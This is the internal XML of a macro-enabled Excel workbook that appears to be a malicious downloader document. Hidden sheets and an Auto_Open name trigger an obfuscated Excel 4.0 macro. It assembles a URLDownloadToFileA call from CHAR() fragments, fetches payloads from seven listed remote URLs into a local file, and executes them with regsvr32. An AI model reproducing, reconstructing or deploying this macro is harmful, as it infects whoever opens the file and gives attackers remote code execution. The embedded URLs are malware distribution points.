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sheet1.xml" ContentType="application/vnd.ms-excel.macro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8m\CIR=ZV\CIR\"/>
    </mc:Choice>
  </mc:AlternateContent>
  <xr:revisionPtr revIDLastSave="0" documentId="13_ncr:1_{5BD5550C-952D-410E-BF14-06EA9A8A4B5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Ykllt" sheetId="2" state="hidden" r:id="rId2"/>
    <sheet name="Bjok" sheetId="3" state="hidden" r:id="rId3"/>
    <sheet name="Thjk" sheetId="4" state="hidden" r:id="rId4"/>
    <sheet name="GV" sheetId="7" state="hidden" r:id="rId5"/>
    <sheet name="HUNJK" sheetId="5" state="hidden" r:id="rId6"/>
  </sheets>
  <definedNames>
    <definedName name="MFCO1">HUNJK!$E$15</definedName>
    <definedName name="MFCO2">HUNJK!$E$17</definedName>
    <definedName name="MFCO3">HUNJK!$E$19</definedName>
    <definedName name="MFCO4">HUNJK!$E$21</definedName>
    <definedName name="MFCO5">HUNJK!$E$23</definedName>
    <definedName name="MFCO6">HUNJK!$E$25</definedName>
    <definedName name="MFCO7">HUNJK!$E$27</definedName>
    <definedName name="_xlnm.Auto_Open">HUNJK!$E$1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" i="3" l="1"/>
  <c r="D6" i="3"/>
  <c r="L9" i="3"/>
  <c r="F11" i="3"/>
  <c r="O16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<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="22" uniqueCount="22">
  <si>
    <t>-</t>
  </si>
  <si>
    <t>G</t>
  </si>
  <si>
    <t>!</t>
  </si>
  <si>
    <t>/</t>
  </si>
  <si>
    <t>r"&amp;"eg"&amp;"sv"&amp;"r3"&amp;"2.exe</t>
  </si>
  <si>
    <t xml:space="preserve">&lt;0, </t>
  </si>
  <si>
    <t>Sys"&amp;"Wow"&amp;"64\</t>
  </si>
  <si>
    <t>\W"&amp;"i"&amp;"ndo"&amp;"ws\</t>
  </si>
  <si>
    <t>",0,0)</t>
  </si>
  <si>
    <t>,0,</t>
  </si>
  <si>
    <t>h</t>
  </si>
  <si>
    <t>t</t>
  </si>
  <si>
    <t>p</t>
  </si>
  <si>
    <t>..\dfeb.ses</t>
  </si>
  <si>
    <t xml:space="preserve"> ..\dfeb.ses</t>
  </si>
  <si>
    <t>broadwaymelody.ca/stats/DVYw4Qpcf1yo/","</t>
  </si>
  <si>
    <t>bigideas.com.au/images/w5FLAJPmvbk9/","</t>
  </si>
  <si>
    <t>webstream.jp/died-wing/oOzfVc/","</t>
  </si>
  <si>
    <t>24hbinhphuoc.com.vn/data/FosZ5GFS6PP3kshbVn7/","</t>
  </si>
  <si>
    <t>bmnegociosinmobiliarios.com.ar/cgi-bin/bijhAMWReA0H3i8a/","</t>
  </si>
  <si>
    <t>binnuryetikdanismanlik.com.tr/images/VbytyOFtS1MF/","</t>
  </si>
  <si>
    <t>breedid.nl/cgi-bin/aCbt/","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</si>
</sst>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0" fontId="3" fillId="0" borderId="0" xfId="1" applyFont="1"/>
    <xf numFmtId="0" fontId="2" fillId="2" borderId="0" xfId="0" applyFont="1" applyFill="1"/>
    <xf numFmtId="0" fontId="2" fillId="0" borderId="0" xfId="0" quotePrefix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IntlMacrosheet" Target="macrosheets/intlsheet1.xml"/><Relationship Id="rId5" Type="http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet" Target="macro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581025</xdr:colOff>
      <xdr:row>1</xdr:row>
      <xdr:rowOff>6221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B5385455-1325-4966-B2A4-9C20F67C3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05825" cy="282446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492CD9B5-1B6D-4218-9E80-E4C827399DDA}">
  <dimension ref="E11"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0">
      <selection activeCell="C19" sqref="C19"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="8.7109375" defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="8.7109375" style="1"/>
  </cols>
  <sheetData>
    <row r="11" spans="5:5" x14ac:dyDescent="0.25">
      <c r="E11" s="1" t="b">
        <f>FORMULA(Ykllt!P22&amp;Ykllt!H9&amp;Ykllt!L2&amp;Ykllt!B15&amp;Ykllt!B15&amp;Bjok!D6&amp;Ykllt!E2&amp;Bjok!F11&amp;Ykllt!F10&amp;Bjok!I2&amp;Ykllt!H4&amp;Ykllt!L2&amp;Bjok!L9&amp;Thjk!I20&amp;GV!C12&amp;GV!F6&amp;Bjok!F21&amp;Thjk!R18&amp;Thjk!E19,E15)=FORMULA(Ykllt!P22&amp;Ykllt!J11&amp;Ykllt!B18&amp;Ykllt!P11&amp;"MFCO1"&amp;Thjk!P8&amp;Ykllt!H9&amp;Ykllt!L2&amp;Ykllt!B15&amp;Ykllt!B15&amp;Bjok!D6&amp;Ykllt!E2&amp;Bjok!F11&amp;Ykllt!F10&amp;Bjok!I2&amp;Ykllt!H4&amp;Ykllt!L2&amp;Bjok!L9&amp;Thjk!I20&amp;GV!C12&amp;GV!F6&amp;Bjok!G23&amp;Thjk!R18&amp;Thjk!E19&amp;Ykllt!P13,E17)=FORMULA(Ykllt!P22&amp;Ykllt!J11&amp;Ykllt!B18&amp;Ykllt!P11&amp;"MFCO2"&amp;Thjk!P8&amp;Ykllt!H9&amp;Ykllt!L2&amp;Ykllt!B15&amp;Ykllt!B15&amp;Bjok!D6&amp;Ykllt!E2&amp;Bjok!F11&amp;Ykllt!F10&amp;Bjok!I2&amp;Ykllt!H4&amp;Ykllt!L2&amp;Bjok!L9&amp;Thjk!I20&amp;GV!C12&amp;GV!F6&amp;Bjok!H21&amp;Thjk!R18&amp;Thjk!E19&amp;Ykllt!P13,E19)=FORMULA(Ykllt!P22&amp;Ykllt!J11&amp;Ykllt!B18&amp;Ykllt!P11&amp;"MFCO3"&amp;Thjk!P8&amp;Ykllt!H9&amp;Ykllt!L2&amp;Ykllt!B15&amp;Ykllt!B15&amp;Bjok!D6&amp;Ykllt!E2&amp;Bjok!F11&amp;Ykllt!F10&amp;Bjok!I2&amp;Ykllt!H4&amp;Ykllt!L2&amp;Bjok!L9&amp;Thjk!I20&amp;GV!C12&amp;GV!F6&amp;Bjok!I23&amp;Thjk!R18&amp;Thjk!E19&amp;Ykllt!P13,E21)=FORMULA(Ykllt!P22&amp;Ykllt!J11&amp;Ykllt!B18&amp;Ykllt!P11&amp;"MFCO4"&amp;Thjk!P8&amp;Ykllt!H9&amp;Ykllt!L2&amp;Ykllt!B15&amp;Ykllt!B15&amp;Bjok!D6&amp;Ykllt!E2&amp;Bjok!F11&amp;Ykllt!F10&amp;Bjok!I2&amp;Ykllt!H4&amp;Ykllt!L2&amp;Bjok!L9&amp;Thjk!I20&amp;GV!C12&amp;GV!F6&amp;Bjok!J21&amp;Thjk!R18&amp;Thjk!E19&amp;Ykllt!P13,E23)=FORMULA(Ykllt!P22&amp;Ykllt!J11&amp;Ykllt!B18&amp;Ykllt!P11&amp;"MFCO5"&amp;Thjk!P8&amp;Ykllt!H9&amp;Ykllt!L2&amp;Ykllt!B15&amp;Ykllt!B15&amp;Bjok!D6&amp;Ykllt!E2&amp;Bjok!F11&amp;Ykllt!F10&amp;Bjok!I2&amp;Ykllt!H4&amp;Ykllt!L2&amp;Bjok!L9&amp;Thjk!I20&amp;GV!C12&amp;GV!F6&amp;Bjok!K23&amp;Thjk!R18&amp;Thjk!E19&amp;Ykllt!P13,E25)=FORMULA(Ykllt!P22&amp;Ykllt!J11&amp;Ykllt!B18&amp;Ykllt!P11&amp;"MFCO6"&amp;Thjk!P8&amp;Ykllt!H9&amp;Ykllt!L2&amp;Ykllt!B15&amp;Ykllt!B15&amp;Bjok!D6&amp;Ykllt!E2&amp;Bjok!F11&amp;Ykllt!F10&amp;Bjok!I2&amp;Ykllt!H4&amp;Ykllt!L2&amp;Bjok!L9&amp;Thjk!I20&amp;GV!C12&amp;GV!F6&amp;Bjok!L21&amp;Thjk!R18&amp;Thjk!E19&amp;Ykllt!P13,E27)=FORMULA(Ykllt!P22&amp;Ykllt!J11&amp;Ykllt!B18&amp;Ykllt!P11&amp;"MFCO7"&amp;Thjk!P8&amp;Ykllt!H9&amp;Ykllt!B15&amp;Ykllt!I17&amp;Ykllt!I3&amp;Ykllt!H13&amp;Ykllt!P11&amp;Ykllt!K9&amp;Ykllt!P13&amp;Ykllt!P7&amp;Ykllt!P13,E29)=FORMULA(Ykllt!P22&amp;Ykllt!H13&amp;Ykllt!N4&amp;Ykllt!H13&amp;Ykllt!H9&amp;Ykllt!P11&amp;Ykllt!P15&amp;Ykllt!H9&amp;Ykllt!P20&amp;Thjk!L15&amp;Thjk!M11&amp;Thjk!H7&amp;Ykllt!P19&amp;Bjok!O16&amp;Thjk!F13&amp;Ykllt!P15&amp;Ykllt!P13,E29)=FORMULA(Ykllt!P22&amp;Ykllt!F4&amp;Ykllt!H13&amp;Ykllt!E6&amp;Ykllt!E11&amp;Ykllt!F4&amp;Ykllt!K23&amp;Ykllt!P11&amp;Ykllt!P13,E35)</f>
        <v>1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5554F4C7-AE0C-42D2-8BC9-0E8694344B9C}">
  <dimension ref="C6:F12"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="1"/>
  </cols>
  <sheetData>
    <row r="6" spans="3:6" x14ac:dyDescent="0.25">
      <c r="F6" s="1" t="str">
        <f>CONCATENATE(Ykllt!P20&amp;Ykllt!P27&amp;Ykllt!P27)</f>
        <v>://</v>
      </c>
    </row>
    <row r="12" spans="3:6" x14ac:dyDescent="0.25">
      <c r="C12" s="1" t="str">
        <f>CONCATENATE(Ykllt!P15&amp;Ykllt!F19&amp;Ykllt!L19&amp;Ykllt!L19&amp;Ykllt!N17&amp;Ykllt!M7)</f>
        <v>"https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77" sqref="AM77"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="1" s="3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EB11E-2154-4772-9BFB-56926CE07272}">
  <dimension ref="A2:Q37"/>
  <sheetViews>
    <sheetView workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="1"/>
  </cols>
  <sheetData>
    <row r="2" spans="1:16" x14ac:dyDescent="0.25">
      <c r="E2" s="1" t="str">
        <f>CHAR(113-2)</f>
        <v>o</v>
      </c>
      <c r="G2" s="1" t="str">
        <f>CHAR(111-6)</f>
        <v>i</v>
      </c>
      <c r="L2" s="1" t="str">
        <f>CHAR(71-6)</f>
        <v>A</v>
      </c>
      <c r="P2" s="1" t="s">
        <v>0</v>
      </c>
    </row>
    <row r="3" spans="1:16" x14ac:dyDescent="0.25">
      <c r="C3" s="1" t="str">
        <f>CHAR(111+3)</f>
        <v>r</v>
      </c>
      <c r="I3" s="1" t="str">
        <f>CHAR(87-4)</f>
        <v>S</v>
      </c>
      <c r="P3" s="1" t="str">
        <f>CHAR(90+2)</f>
        <v>\</v>
      </c>
    </row>
    <row r="4" spans="1:16" x14ac:dyDescent="0.25">
      <c r="F4" s="1" t="str">
        <f>CHAR(100-18)</f>
        <v>R</v>
      </c>
      <c r="H4" s="1" t="str">
        <f>CHAR(110-9)</f>
        <v>e</v>
      </c>
      <c r="K4" s="1">
        <v>1</v>
      </c>
      <c r="N4" s="1" t="str">
        <f>CHAR(89-1)</f>
        <v>X</v>
      </c>
    </row>
    <row r="5" spans="1:16" x14ac:dyDescent="0.25">
      <c r="B5" s="1" t="str">
        <f>CHAR(115+2)</f>
        <v>u</v>
      </c>
      <c r="P5" s="1" t="str">
        <f>CHAR(44+2)</f>
        <v>.</v>
      </c>
    </row>
    <row r="6" spans="1:16" x14ac:dyDescent="0.25">
      <c r="E6" s="1" t="str">
        <f>CHAR(90-6)</f>
        <v>T</v>
      </c>
      <c r="J6" s="1" t="str">
        <f>CHAR(77-3)</f>
        <v>J</v>
      </c>
    </row>
    <row r="7" spans="1:16" x14ac:dyDescent="0.25">
      <c r="D7" s="1" t="str">
        <f>CHAR(107+3)</f>
        <v>n</v>
      </c>
      <c r="F7" s="1">
        <v>3</v>
      </c>
      <c r="M7" s="1" t="str">
        <f>CHAR(117-2)</f>
        <v>s</v>
      </c>
      <c r="P7" s="1" t="str">
        <f>CHAR(41+3)</f>
        <v>,</v>
      </c>
    </row>
    <row r="9" spans="1:16" x14ac:dyDescent="0.25">
      <c r="C9" s="1" t="str">
        <f>CHAR(110-2)</f>
        <v>l</v>
      </c>
      <c r="H9" s="1" t="str">
        <f>CHAR(70-3)</f>
        <v>C</v>
      </c>
      <c r="K9" s="1" t="str">
        <f>CHAR(55-7)</f>
        <v>0</v>
      </c>
      <c r="P9" s="1" t="str">
        <f>CHAR(55+5)</f>
        <v>&lt;</v>
      </c>
    </row>
    <row r="10" spans="1:16" x14ac:dyDescent="0.25">
      <c r="F10" s="1" t="str">
        <f>CHAR(123-4)</f>
        <v>w</v>
      </c>
    </row>
    <row r="11" spans="1:16" x14ac:dyDescent="0.25">
      <c r="E11" s="1" t="str">
        <f>CHAR(80+5)</f>
        <v>U</v>
      </c>
      <c r="J11" s="1" t="str">
        <f>CHAR(80-7)</f>
        <v>I</v>
      </c>
      <c r="L11" s="1" t="str">
        <f>CHAR(100-1)</f>
        <v>c</v>
      </c>
      <c r="P11" s="1" t="str">
        <f>CHAR(35+5)</f>
        <v>(</v>
      </c>
    </row>
    <row r="12" spans="1:16" x14ac:dyDescent="0.25">
      <c r="A12" s="1" t="str">
        <f>CHAR(107+2)</f>
        <v>m</v>
      </c>
    </row>
    <row r="13" spans="1:16" x14ac:dyDescent="0.25">
      <c r="D13" s="1" t="str">
        <f>CHAR(72-4)</f>
        <v>D</v>
      </c>
      <c r="H13" s="1" t="str">
        <f>CHAR(68+1)</f>
        <v>E</v>
      </c>
      <c r="N13" s="1">
        <v>2</v>
      </c>
      <c r="P13" s="1" t="str">
        <f>CHAR(36+5)</f>
        <v>)</v>
      </c>
    </row>
    <row r="14" spans="1:16" x14ac:dyDescent="0.25">
      <c r="G14" s="1" t="str">
        <f>CHAR(124-4)</f>
        <v>x</v>
      </c>
      <c r="K14" s="1" t="str">
        <f>CHAR(70-4)</f>
        <v>B</v>
      </c>
    </row>
    <row r="15" spans="1:16" x14ac:dyDescent="0.25">
      <c r="B15" s="1" t="str">
        <f>CHAR(80-4)</f>
        <v>L</v>
      </c>
      <c r="F15" s="1" t="str">
        <f>CHAR(105-5)</f>
        <v>d</v>
      </c>
      <c r="P15" s="1" t="str">
        <f>CHAR(31+3)</f>
        <v>"</v>
      </c>
    </row>
    <row r="17" spans="2:16" x14ac:dyDescent="0.25">
      <c r="D17" s="1" t="str">
        <f>CHAR(102-5)</f>
        <v>a</v>
      </c>
      <c r="I17" s="1" t="str">
        <f>CHAR(78+1)</f>
        <v>O</v>
      </c>
      <c r="K17" s="1" t="s">
        <v>1</v>
      </c>
      <c r="N17" s="1" t="s">
        <v>12</v>
      </c>
      <c r="P17" s="1" t="str">
        <f>CHAR(40-2)</f>
        <v>&amp;</v>
      </c>
    </row>
    <row r="18" spans="2:16" x14ac:dyDescent="0.25">
      <c r="B18" s="1" t="str">
        <f>CHAR(65+5)</f>
        <v>F</v>
      </c>
    </row>
    <row r="19" spans="2:16" x14ac:dyDescent="0.25">
      <c r="F19" s="1" t="s">
        <v>10</v>
      </c>
      <c r="L19" s="1" t="s">
        <v>11</v>
      </c>
      <c r="P19" s="1" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
    </row>
    <row r="20" spans="2:16" x14ac:dyDescent="0.25">
      <c r="H20" s="1">
        <v>8</v>
      </c>
      <c r="P20" s="1" t="str">
        <f>CHAR(52+6)</f>
        <v>:</v>
      </c>
    </row>
    <row r="22" spans="2:16" x14ac:dyDescent="0.25">
      <c r="P22" s="1" t="str">
        <f>CHAR(66-5)</f>
        <v>=</v>
      </c>
    </row>
    <row r="23" spans="2:16" x14ac:dyDescent="0.25">
      <c r="K23" s="1" t="str">
        <f>CHAR(80-2)</f>
        <v>N</v>
      </c>
    </row>
    <row r="24" spans="2:16" x14ac:dyDescent="0.25">
      <c r="G24" s="1" t="str">
        <f>CHAR(84-2)</f>
        <v>R</v>
      </c>
      <c r="P24" s="1" t="s">
        <v>2</v>
      </c>
    </row>
    <row r="26" spans="2:16" x14ac:dyDescent="0.25">
      <c r="I26" s="1" t="str">
        <f>CHAR(84)</f>
        <v>T</v>
      </c>
    </row>
    <row r="27" spans="2:16" x14ac:dyDescent="0.25">
      <c r="P27" s="1" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="32" spans="2:16" x14ac:dyDescent="0.25">
      <c r="I32" s="1">
        <f>_xlfn.ARABIC("CXI")</f>
        <v>111</v>
      </c>
    </row>
    <row r="33" spans="5:17" x14ac:dyDescent="0.25">
      <c r="O33" s="1">
        <f>_xlfn.ARABIC("LXVII")</f>
        <v>67</v>
      </c>
    </row>
    <row r="35" spans="5:17" x14ac:dyDescent="0.25">
      <c r="E35" s="1">
        <f>_xlfn.ARABIC("LXI")</f>
        <v>61</v>
      </c>
    </row>
    <row r="36" spans="5:17" x14ac:dyDescent="0.25">
      <c r="Q36" s="1">
        <f>_xlfn.ARABIC("CXIV")</f>
        <v>114</v>
      </c>
    </row>
    <row r="37" spans="5:17" x14ac:dyDescent="0.25">
      <c r="K37" s="1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5F7A-ADDF-4825-8528-68C3B8F49277}">
  <dimension ref="D2:O23"/>
  <sheetViews>
    <sheetView workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="1"/>
  </cols>
  <sheetData>
    <row r="2" spans="4:15" x14ac:dyDescent="0.25">
      <c r="I2" s="1" t="str">
        <f>T(Ykllt!D7&amp;Ykllt!C9&amp;Ykllt!E2&amp;Ykllt!D17&amp;Ykllt!F15&amp;Ykllt!E6&amp;Ykllt!E2&amp;Ykllt!B18&amp;Ykllt!G2&amp;Ykllt!C9)</f>
        <v>nloadToFil</v>
      </c>
    </row>
    <row r="6" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D6" s="1" t="str">
        <f>T(Ykllt!P11&amp;Ykllt!P15&amp;Ykllt!B5&amp;Ykllt!C3&amp;Ykllt!C9&amp;Ykllt!A12)</f>
        <v>("urlm</v>
      </c>
    </row>
    <row r="9" spans="4:15" x14ac:dyDescent="0.25">
      <c r="L9" s="1" t="str">
        <f>T(Ykllt!P15&amp;Ykllt!P7&amp;Ykllt!P15&amp;Ykllt!J6&amp;Ykllt!J6&amp;Ykllt!H9&amp;Ykllt!H9&amp;Ykllt!K14&amp;Ykllt!K14&amp;Ykllt!P15)</f>
        <v>","JJCCBB"</v>
      </c>
    </row>
    <row r="11" spans="4:15" x14ac:dyDescent="0.25">
      <c r="F11" s="1" t="str">
        <f>T(Ykllt!D7&amp;Ykllt!P15&amp;Ykllt!P7&amp;Ykllt!P15&amp;Ykllt!E11&amp;Ykllt!F4&amp;Ykllt!B15&amp;Ykllt!D13&amp;Ykllt!E2)</f>
        <v>n","URLDo</v>
      </c>
    </row>
    <row r="16" spans="4:15" x14ac:dyDescent="0.25">
      <c r="O16" s="1" t="str">
        <f>T(Ykllt!P2&amp;Ykllt!M7)</f>
        <v>-s</v>
      </c>
    </row>
    <row r="19" spans="6:12" x14ac:dyDescent="0.25">
      <c r="F19" s="2"/>
      <c r="G19" s="2"/>
    </row>
    <row r="20" spans="6:12" x14ac:dyDescent="0.25">
      <c r="F20" s="2"/>
      <c r="G20" s="4"/>
    </row>
    <row r="21" spans="6:12" x14ac:dyDescent="0.25">
      <c r="F21" s="1" t="s">
        <v>15</v>
      </c>
      <c r="H21" s="1" t="s">
        <v>17</v>
      </c>
      <c r="J21" s="1" t="s">
        <v>19</v>
      </c>
      <c r="L21" s="1" t="s">
        <v>21</v>
      </c>
    </row>
    <row r="23" spans="6:12" x14ac:dyDescent="0.25">
      <c r="G23" s="1" t="s">
        <v>16</v>
      </c>
      <c r="I23" s="1" t="s">
        <v>18</v>
      </c>
      <c r="K23" s="1" t="s">
        <v>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86942-7CAB-42C1-93A9-54D334132813}">
  <dimension ref="E4:R20"/>
  <sheetViews>
    <sheetView workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="1"/>
  </cols>
  <sheetData>
    <row r="4" spans="6:18" x14ac:dyDescent="0.25">
      <c r="R4" s="2"/>
    </row>
    <row r="7" spans="6:18" x14ac:dyDescent="0.25">
      <c r="H7" s="1" t="s">
        <v>4</v>
      </c>
    </row>
    <row r="8" spans="6:18" x14ac:dyDescent="0.25">
      <c r="P8" s="1" t="s">
        <v>5</v>
      </c>
    </row>
    <row r="11" spans="6:18" x14ac:dyDescent="0.25">
      <c r="M11" s="1" t="s">
        <v>6</v>
      </c>
    </row>
    <row r="13" spans="6:18" x14ac:dyDescent="0.25">
      <c r="F13" s="1" t="s">
        <v>14</v>
      </c>
    </row>
    <row r="15" spans="6:18" x14ac:dyDescent="0.25">
      <c r="L15" s="1" t="s">
        <v>7</v>
      </c>
    </row>
    <row r="18" spans="5:18" x14ac:dyDescent="0.25">
      <c r="R18" s="1" t="s">
        <v>13</v>
      </c>
    </row>
    <row r="19" spans="5:18" x14ac:dyDescent="0.25">
      <c r="E19" s="1" t="s">
        <v>8</v>
      </c>
    </row>
    <row r="20" spans="5:18" x14ac:dyDescent="0.25">
      <c r="I20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2</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="6" baseType="lpstr">
      <vt:lpstr>Sheet</vt:lpstr>
      <vt:lpstr>Ykllt</vt:lpstr>
      <vt:lpstr>Bjok</vt:lpstr>
      <vt:lpstr>Thjk</vt:lpstr>
      <vt:lpstr>GV</vt:lpstr>
      <vt:lpstr>HUNJK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2022-03-18T07:44:36Z</dcterms:modified>
</cp:coreProperties>
</file>